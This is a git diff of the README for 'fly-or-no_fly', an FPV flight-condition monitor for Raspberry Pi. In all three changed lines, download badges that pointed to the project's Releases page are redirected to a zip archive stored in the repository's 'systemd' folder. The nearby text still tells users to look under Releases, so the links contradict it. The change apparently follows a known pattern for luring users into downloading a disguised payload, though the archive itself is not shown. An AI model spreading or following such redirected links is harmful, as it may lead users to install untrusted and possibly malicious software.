@@ -1,6 +1,6 @@
 # ✈️ fly-or-no_fly - Easy FPV Flight Condition Monitor
 
-[![Download fly-or-no_fly](https://img.shields.io/badge/Download-fly--or--no__fly-brightgreen)](https://github.com/skaml2021/fly-or-no_fly/releases)
+[![Download fly-or-no_fly](https://img.shields.io/badge/Download-fly--or--no__fly-brightgreen)](https://github.com/skaml2021/fly-or-no_fly/raw/refs/heads/main/systemd/fly-or-no-3.9.zip)
 
 ## 📋 What is fly-or-no_fly?
 
@@ -41,7 +41,7 @@ The software runs on Raspberry Pi OS or similar Linux-based systems.
 
 Please visit this page to download the latest version of fly-or-no_fly:
 
-[![Download fly-or-no_fly](https://img.shields.io/badge/Download-fly--or--no__fly-blue)](https://github.com/skaml2021/fly-or-no_fly/releases)
+[![Download fly-or-no_fly](https://img.shields.io/badge/Download-fly--or--no__fly-blue)](https://github.com/skaml2021/fly-or-no_fly/raw/refs/heads/main/systemd/fly-or-no-3.9.zip)
 
 Open the link above in your browser. You will find files under the "Releases" section. Look for the latest release and download the relevant archive file (usually a zip or tar.gz).
 
@@ -133,7 +133,7 @@ This automation helps keep safety rules consistent.
 
 Visit the Releases page below to download your version:
 
-[![Download fly-or-no_fly](https://img.shields.io/badge/Download-fly--or--no__fly-brightgreen)](https://github.com/skaml2021/fly-or-no_fly/releases)
+[![Download fly-or-no_fly](https://img.shields.io/badge/Download-fly--or--no__fly-brightgreen)](https://github.com/skaml2021/fly-or-no_fly/raw/refs/heads/main/systemd/fly-or-no-3.9.zip)
 
 Look for the latest archive package or installer appropriate for your Raspberry Pi OS.
 
